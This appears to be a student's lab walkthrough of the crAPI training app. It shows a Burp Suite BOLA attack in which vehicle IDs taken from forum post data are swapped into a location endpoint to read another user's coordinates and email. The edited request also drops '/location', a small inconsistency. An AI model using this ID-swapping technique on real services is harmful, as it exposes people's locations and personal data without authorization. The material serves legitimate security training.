For this lab the instructor logs in as himself, then when the the page loads we are at localhost:8888/dashboard which loads up our dashboard, 

The web application from crapi labs gave us a vechile and its pin so it loads 

VIN: 1GIGF95XMMN431588
Company :	Mercedes-Benz
Model :	GLA Class
Fuel Type :	PETROL
Year :	2025

with an image of our car on the dashboard, from here if we visit the Community tab on the nav bar, we are brought to what looks like a community forum url is `http://localhost:8888/forum` from here we click on one of the three posts we get the url `http://localhost:8888/post?post_id=p9YNVj5mQG9CssvvHfQrMm` and from here we have generated enough traffic on burp suite and we can go to check it out to start testing for BOLA

if we check the traffic we send the following to repeater:
GET /community/api/v2/community/posts/recent?limit=30&offset=0 

and from there we see the response is the following for that GET request

```json
{"posts":[{"id":"p9YNVj5mQG9CssvvHfQrMm","title":"Title 3","content":"Hello world 3","author":{"nickname":"Robot","email":"robot001@example.com","vehicleid":"4bae9968-ec7f-4de3-a3a0-ba1b2ab5e5e5","profile_pic_url":"","created_at":"2025-01-14T04:08:46.339Z"},"comments":[],"authorid":3,"CreatedAt":"2025-01-14T04:08:46.339Z"},{"id":"wYNViivCKB9BTYM3MCpPcU","title":"Title 2","content":"Hello world 2","author":{"nickname":"Pogba","email":"pogba006@example.com","vehicleid":"cd515c12-0fc1-48ae-8b61-9230b70a845b","profile_pic_url":"","created_at":"2025-01-14T04:08:46.339Z"},"comments":[],"authorid":2,"CreatedAt":"2025-01-14T04:08:46.339Z"},{"id":"77tfYoggTUcQHQf247u5PH","title":"Title 1","content":"Hello world 1","author":{"nickname":"Adam","email":"adam007@example.com","vehicleid":"f89b5f21-7829-45cb-a650-299a61090378","profile_pic_url":"","created_at":"2025-01-14T04:08:46.332Z"},"comments":[],"authorid":1,"CreatedAt":"2025-01-14T04:08:46.332Z"}],"next_offset":null,"previous_offset":null,"total":3}

```

from here we go back to our burp suite http history we go send this following to repeater:

GET /identity/api/v2/vehicle/80c2d9f1-159f-4f79-a77d-ccf0ec47efb7/location 

and this is where we start testing for BOLA, we replace that vechile id in the url with one of the vechileid from the json response from /community and we paste into the request 
GET /identity/api/v2/vehicle/80c2d9f1-159f-4f79-a77d-ccf0ec47efb7/location 

so we change 

GET /identity/api/v2/vehicle/80c2d9f1-159f-4f79-a77d-ccf0ec47efb7/location 

to

GET /identity/api/v2/vehicle/4bae9968-ec7f-4de3-a3a0-ba1b2ab5e5e5/

and we get this to return:

```json
{"carId":"4bae9968-ec7f-4de3-a3a0-ba1b2ab5e5e5","vehicleLocation":{"id":3,"latitude":"37.746880","longitude":"-84.301460"},"fullName":"Robot","email":"robot001@example.com"}
```

this confirms BOLA since we are logged in as john@test.com

we are able to retrieve our own vechile information 
GET /identity/api/v2/vehicle/80c2d9f1-159f-4f79-a77d-ccf0ec47efb7/location 

but if we go to the community posts at /forum, check the http history and we found another vechcile id and used it in our request we get someone else vechile, we also get their email etc.
